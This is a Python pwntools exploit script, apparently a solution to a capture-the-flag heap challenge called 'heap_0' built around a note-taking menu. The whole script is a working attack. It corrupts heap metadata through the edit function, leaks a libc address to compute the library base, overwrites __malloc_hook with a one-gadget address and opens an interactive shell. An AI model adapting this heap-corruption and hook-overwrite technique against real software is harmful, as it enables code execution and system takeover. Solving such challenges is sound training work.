from pwn import *
import sys

if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./heap_0")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	elf = ELF("./heap_0")
else:
	pass

def menu(choice):
	p.sendlineafter("> ",str(choice))

def add(content):
	menu(1)
	p.sendafter("Input note: ",content)

def show(index):
	menu(2)
	p.sendlineafter("Note id: ",str(index))

def edit(index,content):
	menu(3)
	p.sendlineafter("Note id: ",str(index))
	p.sendafter("New note: ",content)

def debugf():
	gdb.attach(p,"b *0x400772")

context.log_level = "debug"
context.terminal = ["tmux","splitw","-h"]
#debugf()
add("a"*8 + "\n")
add("b"*8 + "\n")
add("c"*8 + "\n")
add("d"*8 + "\n")
add("e"*8 + "\n")
add("f"*8 + "\n")
add("g"*8 + "\n") # target 6
add("h"*8 + "\n")
add("i"*8 + "\n")
add("j"*8 + "\n") # target 9
add("k"*8 + "\n")
payload = p64(0) * 2 + p64(0x28) + p64(11) + p64(0) + "\n"
#debugf()
edit(9,payload)
edit(11,"\x00"*0x8 + p64(0x6015b8) + "\n")
show(0x000000000a000000)
p.recvuntil("Your note: ")
leak_addr = u64(p.recvuntil("\n",drop = True).ljust(8,"\x00"))
libc.address = leak_addr - 0x3c6780
log.success("libc_base:" + hex(libc.address))
debugf()
payload = p64(0x28) + p64(7) + p64(0) * 3 + "\n"
edit(6,payload)
edit(7,p64(0) * 3 + p64(libc.symbols["__malloc_hook"] - 0x23) + "\n")
one_gadget = libc.address + 0xf02b0
payload = "%pa" + p64(libc.address+0xf1147)*2+p64(libc.address+0x846D0) + "\n"
edit(0x7f,payload)
#menu(1)
p.sendlineafter("> ","1".ljust(0x10,"\x00"))
p.interactive()
